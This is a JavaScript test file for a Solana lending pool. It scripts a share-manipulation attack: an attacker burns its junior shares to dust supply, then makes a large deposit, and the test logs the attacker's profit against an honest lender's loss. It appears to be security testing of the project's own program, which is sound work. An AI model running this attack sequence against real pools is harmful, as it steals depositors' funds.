import test from 'node:test';
import assert from 'node:assert/strict';
import { U, USDC, advance, depositIx, depositBorrowerIx, drawIx, newLender, open, readPool, repayIx, sendB, sendL, setup, tokenBalance, mintSupply } from '/home/bills/code/dev3pack/notch/tests/lib.js';
test('dust burn + big deposit when price > 1', async () => {
  const { getBurnInstruction } = await import('/home/bills/code/dev3pack/notch/node_modules/@solana-program/token/dist/src/index.mjs');
  const ctx = await setup({ seed: 0n, borrowerFunds: 200n * USDC });
  const atk = await newLender(ctx, 200000n * USDC);
  const alice = await newLender(ctx, 10n * USDC);
  assert.ok((await sendL(ctx, atk, depositIx(ctx, atk, 100n * USDC))).ok);
  assert.ok((await sendL(ctx, alice, depositIx(ctx, alice, 900_000n))).ok);
  await open(ctx, 200);
  assert.ok((await sendB(ctx, depositBorrowerIx(ctx, U(20)))).ok);
  assert.ok((await sendB(ctx, drawIx(ctx, 50n * USDC))).ok);
  advance(ctx, 31);
  assert.ok((await sendB(ctx, repayIx(ctx, U(51)))).ok);
  const nav = () => readPool(ctx.svm, ctx.pool).juniorNav, sup = () => mintSupply(ctx.svm, ctx.juniorMint);
  const worth = (a) => tokenBalance(ctx.svm, a.shares) * nav() / sup();
  const aliceBefore = worth(alice), atkBefore = worth(atk);
  const atkUsdc0 = tokenBalance(ctx.svm, atk.usdc);
  console.log('pre-burn nav', nav(), 'supply', sup(), 'alice worth', aliceBefore, 'atk worth', atkBefore);
  assert.ok((await sendL(ctx, atk, getBurnInstruction({ account: atk.shares, mint: ctx.juniorMint, authority: atk.signer, amount: tokenBalance(ctx.svm, atk.shares) }))).ok);
  console.log('dust supply', sup(), 'nav', nav());
  const X = 100000n * USDC;
  assert.ok((await sendL(ctx, atk, depositIx(ctx, atk, X))).ok);
  const atkNet = worth(atk) - X;  // value recovered beyond the new deposit
  console.log('attacker: burned worth', atkBefore, 'recovered', atkNet, 'profit', atkNet - atkBefore);
  console.log('alice: before', aliceBefore, 'after', worth(alice), 'loss', aliceBefore - worth(alice));
});
